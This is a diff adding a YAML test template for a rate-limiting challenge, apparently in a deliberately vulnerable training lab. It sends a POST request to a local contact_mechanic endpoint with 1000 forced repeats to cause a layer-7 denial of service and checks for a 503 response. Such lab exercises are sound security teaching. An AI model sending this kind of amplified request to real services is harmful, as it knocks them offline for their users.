@@ -1,0 +1,23 @@
+name: Rate-limiting template for challenge 6 
+
+description: |- 
+              Endpoint /workshop/api/merchant/contact_mechanic was suspected to be DOS-able.
+              We realised that repeat_request_if_failed and number_of_repeats can be manipulated 
+              to cause the service to break.
+
+requests:
+  - url: http://localhost:8888/workshop/api/merchant/contact_mechanic
+    method: POST
+    headers:
+      Authorization: Bearer {add your own jwt}
+    json:
+      mechanic_code: arbitrary_mechanic
+      problem_details: arbitrary_problems
+      vin: arbitrary_VIN
+      mechanic_api: http://127.0.0.1/random
+      repeat_request_if_failed: true
+      number_of_repeats: 1000
+    response_checks:
+      - status_code: 503
+      - text:
+          - pattern: Service unavailable. Seems like you caused layer 7 DoS :)
